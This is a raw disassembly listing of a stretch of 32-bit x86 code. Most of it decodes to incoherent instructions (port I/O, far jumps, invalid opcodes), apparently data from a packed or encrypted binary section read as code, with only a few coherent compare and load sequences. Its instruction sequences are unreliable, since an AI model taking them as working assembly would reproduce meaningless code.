  404228:	test   BYTE PTR [ecx+0x5255ea23],0x99
  40422f:	cs cmp eax,0xcbb20a5e
  404235:	retf   
  404236:	xor    al,0x7a
  404238:	mov    ecx,0x2fc2176
  40423d:	sbb    al,0xf3
  404240:	push   ds
  404241:	icebp  
  404242:	add    BYTE PTR [eiz*1-0x58653ce8],0xd6
  40424a:	jmp    0xfecc:0x3df1f699
  404251:	push   ecx
  404252:	stc    
  404253:	mov    bh,0x74
  404255:	add    al,BYTE PTR [ecx+0x91efe0c]
  40425b:	xchg   ecx,eax
  40425c:	push   cs
  40425d:	pop    esp
  40425e:	and    eax,0x87877e20
  404263:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  404265:	mov    dl,0x2
  404267:	in     al,dx
  404268:	jmp    0x4042a7
  40426a:	repnz sub DWORD PTR [eax+0x23],0x91a807e3
  404272:	push   ebp
  404273:	arpl   dx,ax
  404275:	fs inc edx
  404277:	mov    ah,0x75
  404279:	bound  esp,QWORD PTR [ebx+0x6f11a5a0]
  40427f:	inc    edi
  404280:	cmp    BYTE PTR [ebp-0x4990b6e7],dl
  404286:	cmp    DWORD PTR [edx],esp
  404288:	out    dx,eax
  404289:	shl    BYTE PTR [ebx],1
  40428b:	mov    cl,BYTE PTR [ecx+0x6e]
  40428e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40428f:	test   al,0x2c
  404291:	inc    edi
  404292:	xchg   ebx,eax
  404293:	mov    ah,0x9
  404296:	ins    DWORD PTR es:[edi],dx
  404297:	inc    eax
  404298:	shl    DWORD PTR [ebx],cl
  40429a:	inc    edx
  40429b:	pop    esp
  40429c:	push   0x15
  40429e:	inc    ecx
  40429f:	inc    esp
  4042a0:	lods   al,BYTE PTR ds:[esi]
  4042a1:	rcl    DWORD PTR [eax+0x7f],cl
  4042a4:	jg     0x404260
  4042a6:	or     bl,bh
  4042a8:	fisttp WORD PTR [edi-0x23]
  4042ab:	fild   QWORD PTR [esi]
  4042ad:	mov    esp,0x74120983
  4042b2:	in     eax,dx
  4042b3:	in     al,dx
  4042b4:	arpl   WORD PTR [esi],bp
  4042b6:	repz fdiv QWORD PTR [edi-0x51]
  4042ba:	adc    dl,BYTE PTR [esp+eax*2-0x15]
  4042be:	xor    ah,BYTE PTR [ebx+ebp*4+0x37]
  4042c2:	cmp    DWORD PTR [ecx+0x6aa1514a],esp
  4042c8:	cmp    ebp,ebx
  4042ca:	mov    cs,eax
  4042cc:	mov    dh,0x62
  4042ce:	mov    al,0x64
  4042d0:	retf   
  4042d1:	inc    ecx
  4042d2:	je     0x4042d7
  4042d4:	sbb    al,BYTE PTR [eax+0x5f834e55]
  4042da:	mov    esi,0x56073804
  4042df:	adc    BYTE PTR ds:0x82faa348,ah
  4042e5:	jp     0x40429a
  4042e7:	cmp    al,0x94
  4042e9:	push   esi
  4042ea:	xchg   esp,eax
  4042eb:	in     eax,0xfd
  4042ed:	aam    0xc
  4042ef:	add    cl,dl
  4042f1:	jmp    0x4042c8
  4042f3:	xchg   edi,eax
  4042f4:	jp     0x4042e6
  4042f6:	mov    ds:0x2cb1b600,eax
  4042fb:	mov    esi,0x640264c0
  404300:	push   ebp
  404301:	mov    ss,WORD PTR [ecx]
  404303:	cmp    ch,BYTE PTR [ebx-0xac17d1f]
  404309:	mov    eax,0x4a75d56e
  40430e:	cmp    BYTE PTR [ebp-0xb022285],dl
  404314:	adc    eax,0x81d9e278
  404319:	adc    BYTE PTR [edi+0x79],al
  40431c:	dec    ebp
  40431d:	sahf   
  40431e:	fst    DWORD PTR [edx]
  404320:	fstp   QWORD PTR [ebp+0x0]
  404323:	sub    esp,eax
  404325:	and    al,0xd5
  404327:	aam    0x63
  404329:	in     al,dx
  40432a:	xchg   esi,eax
  40432b:	dec    edx
  40432c:	xchg   ebx,eax
  40432d:	cmp    DWORD PTR [ebp-0x1af09f7c],ebp
  404333:	push   eax
  404334:	cmp    al,0x9b
  404336:	(bad)  [esi-0x7c2362f3]
  40433c:	popa   
  40433d:	push   eax
  40433e:	sub    al,0xdc
  404340:	pushf  
  404341:	mov    eax,0xc10ab915
  404346:	xor    eax,0xb38f241f
  40434b:	idiv   BYTE PTR [ecx+0x65e8a6e2]
  404351:	out    dx,al
  404352:	pop    ebp
  404353:	call   0x44b7:0x93b85f41
  40435a:	inc    ebx
  40435b:	or     BYTE PTR [ebx+edx*4+0x1c],dl
  40435f:	mov    al,ds:0x51b5d8ea
  404364:	jmp    0xec62:0x6a28e61d
  40436b:	sbb    DWORD PTR [esi+0x458bb9d9],ebx
  404371:	mov    ah,0xad
  404373:	aad    0x13
  404375:	(bad)  
  404377:	add    ecx,esi
  404379:	xchg   esi,eax
  40437a:	or     al,0x8e
  40437c:	test   al,0xb
  40437e:	adc    DWORD PTR [ecx-0x5584f402],ebx
  404384:	xor    al,0xbb
  404386:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404387:	outs   dx,BYTE PTR ds:[esi]
  404388:	je     0x4043f3
  40438a:	icebp  
  40438b:	arpl   WORD PTR [esi+0x6a9bb9e5],di
  404391:	mov    ds:0xfc23b8d0,eax
  404396:	ss mov bh,0xa3
  404399:	std    
  40439a:	xchg   BYTE PTR [edx-0x44],dh
  40439d:	and    eax,0xf44ef4cd
  4043a2:	popf   
  4043a3:	jae    0x4043af
  4043a5:	cmp    esi,edi
  4043a7:	aad    0x60
  4043a9:	xor    al,0x12
  4043ab:	inc    ebx
  4043ac:	push   eax
  4043ad:	arpl   WORD PTR [ecx+0xc],dx
  4043b0:	dec    esi
  4043b1:	ret    0x670c
  4043b4:	inc    ebp
  4043b5:	mov    edx,0xba8c6513
  4043ba:	stos   DWORD PTR es:[edi],eax
  4043bb:	push   ss
  4043bc:	dec    ecx
  4043bd:	rcl    DWORD PTR [esp+edx*2],1
  4043c0:	sub    al,0x95
  4043c2:	lods   eax,DWORD PTR ds:[esi]
  4043c3:	sbb    al,0x43
  4043c5:	dec    edi
  4043c6:	fidivr DWORD PTR [eax+0x98f587]
  4043cc:	sbb    al,0xdf
  4043ce:	mov    eax,ds:0xd19917f7
  4043d3:	sub    ecx,eax
  4043d5:	jmp    0x43c9d07b
  4043da:	xchg   esp,eax
  4043db:	pop    esi
  4043dc:	pusha  
  4043dd:	cmp    esi,DWORD PTR [ebx+0x5e494051]
  4043e3:	or     BYTE PTR [ebx+0x20],ah
  4043e6:	std    
  4043e7:	sbb    BYTE PTR [eax],dh
  4043e9:	pop    ds
  4043ea:	mov    dl,0x39
  4043ec:	inc    edi
  4043ed:	mov    eax,0x3fbcaf19
  4043f2:	sbb    BYTE PTR [eax-0x3e],bl
  4043f5:	push   esp
  4043f6:	push   ds
  4043f7:	push   ecx
  4043f8:	mov    BYTE PTR [eax],ah
  4043fa:	rcl    BYTE PTR [ecx],cl
  4043fc:	pop    es
  4043fd:	dec    ebx
  4043fe:	sbb    DWORD PTR [edi-0x4b],edx
  404401:	dec    ebx
  404402:	stos   BYTE PTR es:[edi],al
  404403:	adc    BYTE PTR [ecx],cl
  404405:	inc    esp
  404406:	aam    0xc4
  404408:	std    
  404409:	sub    esi,eax
  40440b:	xor    ch,BYTE PTR [esi-0x5f]
  40440e:	repz les esp,FWORD PTR [ecx+0x5a]
  404412:	xchg   esp,eax
  404413:	(bad)  
  404414:	mov    bl,0x5a
  404416:	dec    esi
  404417:	and    dh,BYTE PTR [ecx]
  404419:	jno    0x4043e4
  40441b:	pusha  
  40441c:	sbb    cl,BYTE PTR [esi+0x47357c]
  404422:	jge    0x4043ae
  404424:	aas    
  404425:	sbb    bh,al
  404427:	mov    eax,ds:0x4932adab
  40442c:	fist   DWORD PTR [ebp+0x0]
  40442f:	xor    ebp,DWORD PTR [ebp+0x6f301a3f]
  404435:	sub    ch,BYTE PTR [ebp-0x4f]
  404438:	fistp  QWORD PTR [ebp+0x107b95f5]
  40443e:	cwde   
  40443f:	ret    0x23aa
  404442:	lock fsub DWORD PTR [edi+0x217d1064]
  40444a:	loop   0x404490
  40444c:	aaa    
  40444d:	imul   edx,DWORD PTR [ebx-0x1c],0x28
  404451:	add    eax,0x85e0311d
  404456:	pop    ebp
  404457:	mov    esi,0x2fae4962
  40445c:	push   edx
  40445d:	cdq    
  40445e:	js     0x4043f1
  404460:	fdiv   QWORD PTR [eax+edx*4+0x773db599]
  404468:	push   edi
  404469:	sti    
  40446a:	mov    ebx,DWORD PTR [edi]
  40446c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40446d:	(bad)  
  40446e:	out    dx,eax
  40446f:	fbld   TBYTE PTR [ebx-0x1c]
  404472:	mov    eax,0xbb641df1
  404477:	push   cs
  404478:	in     al,dx
  404479:	stos   BYTE PTR es:[edi],al
  40447a:	inc    bl
  40447c:	inc    edi
  40447d:	mov    bh,0xa9
  40447f:	jecxz  0x4044e3
  404481:	lods   al,BYTE PTR ds:[esi]
  404482:	ficom  DWORD PTR [ebp+ebx*1-0x69]
  404486:	ret    
  404487:	test   al,0x72
  404489:	loope  0x404498
  40448b:	push   0xbfe93f23
  404490:	add    al,0xbb
  404492:	push   esp
  404493:	jae    0x4044ef
  404495:	data16 mov WORD PTR [eax],?
  404498:	xor    al,0xd9
  40449a:	adc    cl,al
  40449c:	bound  eax,QWORD PTR [ecx+0x6a]
  40449f:	icebp  
  4044a0:	fwait
  4044a1:	scas   eax,DWORD PTR es:[edi]
  4044a2:	lds    eax,FWORD PTR [esi]
  4044a4:	pop    ebp
  4044a5:	cli    
  4044a6:	fsub   DWORD PTR [edi+ebp*1]
  4044a9:	sahf   
  4044aa:	ja     0x404518
  4044ac:	fnsave [eax+ecx*4+0xd]
  4044b0:	stos   BYTE PTR es:[edi],al
  4044b1:	adc    DWORD PTR [edx+ebp*8],edi
  4044b4:	sub    DWORD PTR [edx+0x1ad86917],eax
  4044ba:	rcl    dl,1
  4044bc:	leave  
  4044bd:	pop    edi
  4044be:	jno    0x40445f
  4044c0:	mov    bl,0xed
  4044c2:	das    
  4044c3:	(bad)  
  4044c4:	push   cs
  4044c5:	mov    ds:0x8ed1c896,eax
  4044ca:	add    bl,ah
  4044cc:	push   ebx
  4044cd:	daa    
  4044ce:	inc    esi
  4044cf:	fisttp WORD PTR [edx-0x7557fabc]
  4044d5:	push   ebp
  4044d6:	(bad)  
  4044d7:	cmp    al,dl
  4044d9:	je     0x404d06
  4044df:	mov    eax,DWORD PTR [ebp+0x8]
  4044e2:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  4044e6:	mov    edx,DWORD PTR [ebp+0xc]
  4044e9:	cmp    al,BYTE PTR [edx]
  4044eb:	jne    0x404d2c
  4044f1:	mov    eax,DWORD PTR [ebp-0x8]
  4044f4:	mov    edx,DWORD PTR [ebp+0xc]
  4044f7:	movsx  edx,BYTE PTR [edx]
  4044fa:	jmp    0x4048ef
  4044ff:	enter  0xe53f,0x49
  404503:	cmc    
  404504:	jne    0x40457a
  404506:	mov    edi,0x8f3c5193
  40450b:	sbb    BYTE PTR ds:0x27ebe67b,bl
  404511:	jle    0x404591
  404513:	push   esi
  404514:	jns    0x404594
  404516:	jle    0x40451f
  404518:	mov    ds:0xc1f9db05,al
  40451e:	into   
  40451f:	pop    eax
  404520:	push   ds
  404521:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404522:	fwait
  404523:	and    cl,BYTE PTR [eax]
  404525:	or     bl,BYTE PTR [edx]
  404527:	inc    ecx
  404528:	mov    esp,0xb528e329
  40452d:	aam    0x83
  40452f:	dec    ecx
  404530:	jno    0x404506
  404532:	inc    edi
  404533:	int    0x52
  404535:	xchg   esi,eax
  404536:	jl     0x40454b
  404538:	push   ds
  404539:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40453a:	outs   dx,DWORD PTR ds:[esi]
  40453b:	sar    BYTE PTR [eax-0x73],1
  40453e:	add    eax,0xef07eed
  404543:	xchg   BYTE PTR [eax+0x73b7c2e1],bl
  404549:	and    eax,0x74e25c39
  40454e:	xchg   edx,eax
  40454f:	sub    al,dl
  404551:	push   edi
  404552:	ins    BYTE PTR es:[edi],dx
  404553:	in     al,dx
  404554:	popf   
  404555:	in     al,dx
  404556:	movlps xmm6,QWORD PTR [edx+eiz*8]
  40455a:	cmp    BYTE PTR [eax+0x5733f372],bh
  404560:	add    al,0xaa
  404562:	leave  
  404563:	data16 or al,0x28
  404566:	aas    
  404567:	dec    eax
  404568:	sar    dl,0xe9
  40456b:	push   0x554c0150
  404570:	xor    DWORD PTR [esi+0x76deb4f6],edx
  404576:	jmp    0x4045b8
  404578:	ficom  DWORD PTR [edi]
  40457a:	push   esp
  40457b:	retf   
  40457c:	or     ch,BYTE PTR [ebx+eiz*2]
  40457f:	pop    esi
  404580:	jle    0x40453e
  404582:	arpl   bp,sp
  404584:	cwde   
  404585:	push   0x8
  404587:	int3   
  404588:	push   ecx
  404589:	push   cs
  40458a:	mov    ah,0xef
  40458c:	inc    edi
  40458d:	int3   
  40458e:	sti    
  40458f:	xchg   ecx,eax
  404590:	xchg   esp,ecx
  404592:	(bad)  
  404593:	shl    BYTE PTR [esi-0x151255bd],1
  404599:	mov    BYTE PTR [edx+0x77b0a12c],bh
  40459f:	sub    esi,DWORD PTR [eax]
  4045a1:	add    al,0x10
  4045a3:	sub    ebp,DWORD PTR [esp+eiz*4+0x76]
  4045a7:	jg     0x404598
  4045a9:	mov    WORD PTR [ecx+0x4a432246],?
  4045af:	xor    eax,0x9e589a18
  4045b4:	int3   
  4045b5:	pop    ds
  4045b6:	cdq    
  4045b7:	mul    DWORD PTR ds:0xcf191c08
  4045bd:	sub    eax,ecx
  4045bf:	adc    ah,ch
  4045c1:	xchg   esp,eax
  4045c2:	or     cl,BYTE PTR [ebp-0x46]
  4045c5:	jmp    0xf19c:0xc59c6702
  4045cc:	sbb    cl,BYTE PTR [edx-0x6c45a2c3]
  4045d2:	mov    ds:0xf3cca6ec,eax
  4045d7:	and    al,0x1f
  4045d9:	retf   
  4045da:	fnstsw WORD PTR [edi+0x18]
  4045dd:	into   
  4045de:	jle    0x4045ba
  4045e0:	(bad)  
  4045e1:	jno    0x404618
  4045e3:	jno    0x4045a3
  4045e5:	imul   ebp,DWORD PTR [ecx+0x4f],0xffffffde
  4045e9:	arpl   WORD PTR [ecx],sp
  4045eb:	sbb    eax,0xa83a70b6
  4045f0:	stc    
  4045f1:	xor    al,0xc3
  4045f3:	xchg   ebx,eax
  4045f4:	stc    
  4045f5:	xlat   BYTE PTR ds:[ebx]
  4045f6:	or     eax,0x59afea19
  4045fb:	aam    0x7b
  4045fd:	push   esi
  4045fe:	pusha  
  4045ff:	test   BYTE PTR [eax+ecx*1-0x648cad17],ch
  404606:	fstp   DWORD PTR [eax]
  404608:	sahf   
  404609:	ss cld 
  40460b:	xor    eax,0xffffffb5
  40460e:	xor    DWORD PTR [eax],0x3e70338f
  404614:	arpl   WORD PTR [edi+0x11c551a4],cx
  40461a:	pop    ss
  40461b:	jl     0x4045c1
  40461d:	mov    esp,0xe1c8183e
  404622:	mov    ds:0x3c3f882,eax
  404627:	mov    al,0xf4
  404629:	les    ebx,FWORD PTR [esi+0x76]
  40462c:	mov    bh,0xdf
  40462e:	mov    eax,ds:0x9cdddd35
  404633:	inc    eax
  404634:	adc    eax,0xeb386b67
  404639:	popa   
  40463a:	(bad)  
  40463b:	jmp    0x37c74b90
  404640:	sar    DWORD PTR [ebx-0x45cdd3c4],0x20
  404647:	jmp    FWORD PTR [ebx+0x42]
  40464a:	mov    bh,0x10
  40464c:	cmp    DWORD PTR [ebx+0x58f464f9],ebp
  404652:	js     0x40465f
  404654:	sti    
  404655:	or     BYTE PTR cs:[esp+esi*2-0xc96aaed],0xe7
  40465e:	push   esi
  40465f:	mov    dh,0x4f
  404661:	mov    bh,0xe2
  404663:	out    dx,al
  404664:	loope  0x404678
  404666:	dec    ebx
  404667:	mov    DWORD PTR [eax+0x38],esp
  40466a:	push   es
  40466b:	mov    ds:0xfe11cc25,al
  404670:	mov    al,BYTE PTR [edi+0x1f65a8c7]
  404676:	or     bh,BYTE PTR [esp+esi*8-0x213e8bc3]
  40467d:	sbb    bl,BYTE PTR [edi]
  40467f:	and    al,0xab
  404681:	jge    0x404627
  404683:	push   0xffffffad
  404685:	sub    bl,dh
  404687:	nop
  404688:	test   BYTE PTR [edi-0x5ece413],0xfd
  40468f:	or     al,0x62
  404691:	fnstenv [eax-0x67]
  404694:	or     ah,cl
  404696:	lods   eax,DWORD PTR ds:[esi]
  404697:	and    edx,esi
  404699:	add    ebp,DWORD PTR [edi-0x58]
  40469c:	pop    es
  40469d:	cmp    DWORD PTR [edi-0x52b7c657],ecx
  4046a3:	mov    al,ds:0x80c65856
  4046a8:	fidiv  DWORD PTR [ecx]
  4046aa:	ja     0x4046f5
  4046ac:	mov    WORD PTR [ecx+0x3cccd422],es
  4046b2:	xchg   ecx,eax
  4046b3:	sahf   
  4046b4:	test   BYTE PTR [edi-0x5c78ce47],cl
  4046ba:	pop    es
  4046bb:	xlat   BYTE PTR ds:[ebx]
  4046bc:	xchg   DWORD PTR [edi-0x22],esi
  4046bf:	stc    
  4046c0:	lahf   
  4046c1:	dec    ebx
  4046c2:	mov    al,al
  4046c4:	sbb    eax,0x74d83ab8
  4046c9:	pusha  
  4046ca:	call   0xc96c5401
  4046cf:	mov    al,0x2b
  4046d1:	cmp    bh,bl
  4046d3:	pop    edi
  4046d4:	or     ebp,DWORD PTR [edx+eiz*4+0x69c203a]
  4046db:	or     DWORD PTR [ecx],edx
  4046dd:	mov    eax,0x64518fee
  4046e2:	push   esi
  4046e3:	ja     0x40468c
  4046e5:	mov    ecx,DWORD PTR [esi+0x33]
  4046e8:	sbb    ebx,DWORD PTR ds:0x903e6ac3
  4046ee:	dec    ebx
  4046ef:	js     0x40470e
  4046f1:	retf   0x466c
  4046f4:	test   BYTE PTR [ebx-0x7a],bl
  4046f7:	jne    0x4046e7
  4046f9:	das    
  4046fa:	xchg   edi,eax
  4046fb:	push   ebp
  4046fc:	pop    ss
  4046fd:	jmp    0x86b9:0x446ed97e
  404704:	adc    DWORD PTR [ebp+0x4f75e7ae],edx
  40470a:	sti    
  40470b:	mov    BYTE PTR [ebx+0x76c2a056],bl
  404711:	or     al,0x23
  404713:	xor    al,0x1e
  404715:	dec    ebp
  404716:	out    0x40,eax
  404718:	jle    0x404730
  40471a:	in     eax,0x27
  40471c:	or     dh,BYTE PTR [edi+0x42]
  40471f:	push   cs
  404720:	test   BYTE PTR [ebp-0x73952d7f],ch
  404726:	dec    ebp
  404727:	sahf   
  404728:	pushf  
  404729:	inc    edx
  40472a:	ins    DWORD PTR es:[edi],dx
  40472b:	or     DWORD PTR [esi-0x46b71b0e],0xffffff8e
  404732:	dec    BYTE PTR [ecx+ebp*8-0x61]
  404736:	jno    0x40471d
  404738:	jle    0x404786
  40473a:	rcl    BYTE PTR [ebp+eax*8+0x335e75ff],1
  404741:	xor    ch,bh
  404743:	repz shr DWORD PTR [esi],1
  404746:	ins    DWORD PTR es:[edi],dx
  404747:	mov    eax,ds:0x305b82d5
  40474c:	mov    dh,0x7c
  40474f:	sub    edx,ebx
  404751:	cmp    bh,0x42
  404754:	jl     0x404746
  404756:	adc    al,ah
  404758:	vpackssdw ymm3,ymm2,YMMWORD PTR [edi]
  40475c:	repnz loop 0x40479c
  40475f:	or     al,0x72
  404761:	jo     0x404736
  404763:	cld    
  404764:	loope  0x40475e
  404766:	mov    bl,BYTE PTR cs:[esi+esi*2+0x73]
  40476b:	mov    ah,BYTE PTR [edx+0x68]
  40476e:	test   BYTE PTR [edi-0x69],dl
  404771:	mov    cl,0x15
  404773:	mov    ds:0xbbfefb49,al
  404778:	push   ds
  404779:	dec    edx
  40477a:	ret    0x108c
  40477d:	or     DWORD PTR [edx-0x7ab59580],ebx
  404783:	xor    BYTE PTR [edx+edx*4+0x3e8f72df],0xa
  40478b:	adc    ebx,DWORD PTR [ecx+esi*8]
  40478e:	lds    eax,FWORD PTR [edi+0xd0d0287]
  404794:	mov    bh,0x75
  404796:	pop    edi
  404797:	sub    eax,0xff3f9ae8
  40479c:	push   edx
  40479d:	mov    DWORD PTR fs:[ecx-0x757a93d0],esi
  4047a4:	fistp  DWORD PTR [ebp+0x21b61d2f]
  4047aa:	inc    esi
  4047ab:	lods   eax,DWORD PTR ds:[esi]
  4047ac:	fst    QWORD PTR [edi-0x3cfdc7f0]
  4047b2:	ss jmp 0xdab1:0x83de7fed
  4047ba:	sbb    al,0xd1
  4047bc:	ins    BYTE PTR es:[edi],dx
  4047bd:	imul   ebx,esi,0xfffffff9
  4047c0:	in     al,0x31
  4047c2:	jb     0x40476f
  4047c4:	outs   dx,BYTE PTR ds:[esi]
  4047c5:	sbb    BYTE PTR [edi],ah
  4047c7:	mov    dh,0xeb
  4047c9:	jmp    0xfcfa:0xbcfe297b
  4047d0:	mov    ah,0xb4
  4047d2:	cmc    
  4047d3:	mov    esp,0x415c44b1
  4047d8:	sub    cl,BYTE PTR [eax-0x15]
  4047db:	dec    ebp
  4047dc:	es es push edi
  4047df:	push   esi
  4047e0:	pop    es
  4047e1:	adc    al,0x16
  4047e3:	adc    DWORD PTR [ecx-0x5ac4fe94],eax
  4047e9:	std    
  4047ea:	adc    DWORD PTR [edi],ecx
  4047ec:	les    ebx,FWORD PTR [eax-0x29]
  4047ef:	jns    0x40479b
  4047f1:	out    0xfa,al
  4047f3:	sbb    al,0x37
  4047f5:	test   al,dl
  4047f7:	bound  edi,QWORD PTR [ecx+0x11]
  4047fa:	add    dh,ch
  4047fc:	leave  
  4047fd:	xchg   edx,eax
  4047ff:	cmp    al,0x5d
  404801:	sub    al,0x12
  404803:	scas   al,BYTE PTR es:[edi]
  404804:	mov    bl,0xf3
  404806:	mov    eax,ds:0xb4f730a8
  40480b:	cmc    
  40480c:	cld    
  40480d:	int    0xc0
  40480f:	xchg   edx,eax
  404810:	cld    
  404811:	mov    esp,0x635b1c48
  404816:	(bad)  
  404817:	dec    edi
  404818:	sbb    al,BYTE PTR [edi-0x1a6599d2]
  40481e:	xor    eax,0xb6cc1c37
  404823:	mov    edi,0xb8361625
  404828:	sub    BYTE PTR [edx+0x5ccf667f],ch
  40482e:	daa    
  40482f:	outs   dx,DWORD PTR ds:[esi]
  404830:	call   0xeac:0x6be86139
  404837:	mov    edx,0x46af9377
  40483c:	test   al,0x54
  40483e:	pop    edi
  40483f:	pop    edi
  404840:	sbb    al,BYTE PTR [edi-0x6f0ef8ce]
  404846:	repz bound ebp,QWORD PTR [ebx]
  404849:	lds    edx,FWORD PTR [ebx-0x689de15a]
  40484f:	mov    esp,0x30323fe4
  404854:	add    cl,ah
  404856:	mov    ebp,0xd508d077
  40485b:	push   ebx
  40485c:	repnz in al,0xba
  40485f:	outs   dx,DWORD PTR ds:[esi]
  404860:	mov    WORD PTR [edi+0x7ec17c52],gs
  404866:	sbb    eax,DWORD PTR [esi]
  404868:	xor    esp,esi
  40486a:	leave  
  40486b:	push   ecx
  40486c:	test   eax,0xc77e61e1
  404871:	fnstsw WORD PTR [edi+0x10]
  404874:	pop    edx
  404875:	add    al,0xd2
  404877:	sbb    al,0x34
  404879:	repnz ins DWORD PTR es:[edi],dx
  40487b:	cmp    DWORD PTR [edi+0x28],ebx
  40487e:	loopne 0x4048c9
  404880:	je     0x4048f2
  404882:	push   0xc505f35e
  404887:	aad    0x3a
  404889:	sti    
  40488a:	push   es
  40488b:	sub    al,0x2
  40488d:	push   ecx
  40488e:	jns    0x404896
  404890:	and    BYTE PTR ds:[ecx-0x76],ch
  404894:	mov    ebx,DWORD PTR [ebp-0x3dc0d536]
  40489a:	mov    al,bh
  40489c:	idiv   DWORD PTR [esi+0x7ab5e058]
  4048a2:	cld    
  4048a3:	mov    bl,0xac
  4048a5:	mov    edx,0x500cdec2
  4048aa:	adc    DWORD PTR [edi],ebp
  4048ac:	push   ds
  4048ad:	les    edx,FWORD PTR [edx+ebx*2+0x2e]
  4048b1:	jb     0x404888
  4048b3:	pushf  
  4048b4:	hlt    
  4048b5:	sub    esi,esi
  4048b7:	lods   al,BYTE PTR ds:[esi]
  4048b8:	in     eax,dx
  4048b9:	aam    0x58
  4048bb:	mov    edi,0xa566c3fe
  4048c0:	push   ds
  4048c1:	inc    ebp
  4048c2:	loop   0x4048ef
  4048c4:	pop    edx
  4048c5:	or     eax,0x65e582a6
  4048ca:	lods   al,BYTE PTR ds:[esi]
  4048cb:	in     eax,0xb
  4048cd:	pop    ebx
  4048ce:	adc    al,0x59
  4048d0:	sbb    al,0x4b
  4048d2:	cdq    
  4048d3:	enter  0xbb43,0xb6
  4048d7:	pop    ss
  4048d8:	cmp    bl,BYTE PTR [edx]
  4048da:	(bad)  [ecx+ebp*2]
  4048dd:	or     ch,BYTE PTR [ecx+0x17]
  4048e0:	mov    bl,0xf4
  4048e2:	jl     0x40493a
  4048e4:	call   0x7d4f:0x5bda3fe1
  4048eb:	pop    esp
  4048ec:	fsubr  st(1),st
  4048ee:	inc    edi
  4048ef:	xor    eax,ecx
  4048f1:	add    eax,esi
  4048f3:	cmp    edx,eax
  4048f5:	je     0x404d20
  4048fb:	mov    DWORD PTR [ebp-0x18],0x705fd8c
  404902:	lea    eax,[ebp-0x18]
  404905:	mov    DWORD PTR [ebp-0x14],eax
  404908:	jmp    0x404cfd
  40490d:	push   ecx
  40490e:	(bad)  
  40490f:	fdivrp st(4),st
  404911:	imul   edi,esp,0xff19635d
  404917:	mov    esi,esi
  404919:	out    dx,al
  40491a:	stos   DWORD PTR es:[edi],eax
  40491b:	nop
  40491c:	call   0x7956:0x7e7e23c3
  404923:	jle    0x4049a3
  404925:	push   0xd394f35a
  40492a:	mov    ecx,0xb34f2c14
  40492f:	(bad)  
  404930:	dec    BYTE PTR [ebp-0x1eebffe3]
  404936:	out    dx,eax
  404937:	sar    BYTE PTR [edx-0x30],cl
  40493a:	mov    bl,0x77
  40493c:	adc    DWORD PTR [ebx],ecx
  40493e:	call   0x72c2:0x3bf6777f
  404945:	pop    ebp
  404946:	inc    esp
  404947:	push   cs
  404948:	hlt    
  404949:	nop
  40494a:	xor    cl,BYTE PTR [eax]
  40494c:	jge    0x40494e
  40494e:	mov    edi,DWORD PTR [esi+0x3]
  404951:	jle    0x404958
  404953:	outs   dx,BYTE PTR ds:[esi]
  404954:	fistp  WORD PTR cs:[edx+0x6c]
  404958:	sub    eax,0xab2eb8f8
  40495d:	ret    
  40495e:	sar    dh,0x5
  404961:	inc    ebx
  404962:	test   cl,ch
  404964:	pushf  
  404965:	inc    ebp
  404966:	pop    edi
  404967:	mov    al,0x61
  404969:	sub    al,0x7e
  40496b:	jae    0x40490e
  40496d:	dec    edx
  40496e:	nop    DWORD PTR [ecx-0x67]
  404972:	mov    cl,0x3f
  404974:	jno    0x4049e6
  404976:	int    0xdd
  404978:	adc    al,0xd9
  40497a:	jmp    0xb113c3d6
  40497f:	out    0x72,al
  404981:	or     bl,BYTE PTR [eax-0x22d848cf]
  404987:	call   FWORD PTR [ecx+0x3c10ca2d]
  40498d:	data16 mov dh,0x1f
  404990:	add    eax,0xe2798b1d
  404995:	and    eax,DWORD PTR [ecx-0xc]
  404998:	ret    
  404999:	fnsave [ecx+0x3e]
  40499c:	pop    ebx
  40499d:	jmp    0x4049cf
  40499f:	jmp    0xae207713
  4049a4:	push   esi
  4049a5:	je     0x4049d6
  4049a7:	clc    
  4049a8:	pmaxsw mm5,QWORD PTR [ebx+0x1]
  4049ac:	enter  0x6ba5,0x20
  4049b0:	sub    ecx,ebp
  4049b2:	ret    
  4049b3:	and    edx,DWORD PTR [edx]
  4049b5:	xchg   edi,eax
  4049b6:	ror    DWORD PTR [edx-0x77ba0fc6],0xf
  4049bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049be:	ins    DWORD PTR es:[edi],dx
  4049bf:	call   DWORD PTR [ebx+0xe603fa9]
  4049c5:	jl     0x4049d8
  4049c7:	inc    edx
  4049c8:	sub    BYTE PTR [edx],bl
  4049ca:	mov    WORD PTR [eax-0x73707135],?
  4049d0:	fst    QWORD PTR es:[ecx+0x2b]
  4049d4:	and    BYTE PTR [esi+0x486c5576],ch
  4049da:	cmp    ebx,DWORD PTR [edi-0x39]
  4049dd:	jg     0x404a55
  4049df:	arpl   WORD PTR [ebx+0x74],bx
  4049e2:	and    al,0x93
  4049e4:	cmp    eax,0xf2ca0b6a
  4049e9:	data16 repz scas al,BYTE PTR es:[edi]
  4049ec:	or     DWORD PTR [edi+0x26],0x3aadd9c3
  4049f3:	or     ebx,ecx
  4049f5:	mov    ds:0x90e6fcb7,al
  4049fa:	out    dx,al
  4049fb:	sub    eax,0x773b741f
  404a00:	inc    ebp
  404a01:	jae    0x4049a0
  404a03:	not    BYTE PTR [ecx+0xe]
  404a06:	mov    dh,cl
  404a08:	xor    edi,DWORD PTR [ebx-0x7a]
  404a0b:	add    ebx,DWORD PTR [ecx-0x47]
  404a0e:	and    al,cl
  404a10:	repz std 
  404a12:	fimul  DWORD PTR [edi+0x33591560]
  404a18:	je     0x404a7e
  404a1a:	das    
  404a1b:	lods   al,BYTE PTR ds:[esi]
  404a1c:	or     BYTE PTR es:[bx+si-0x50],0x76
  404a22:	add    DWORD PTR [edx+0x29],esp
  404a25:	xor    eax,0xf3497da6
  404a2a:	or     ebx,esp
  404a2c:	sub    bh,BYTE PTR gs:[ebx-0x24]
  404a30:	jae    0x404a8a
  404a32:	imul   edi,eax,0x586be64a
  404a38:	mov    edi,0x27d8e68b
  404a3d:	or     eax,0x9369246
  404a42:	cli    
  404a43:	pusha  
  404a44:	std    
  404a45:	mov    ecx,0x57fcf358
  404a4a:	sbb    edi,DWORD PTR [edx]
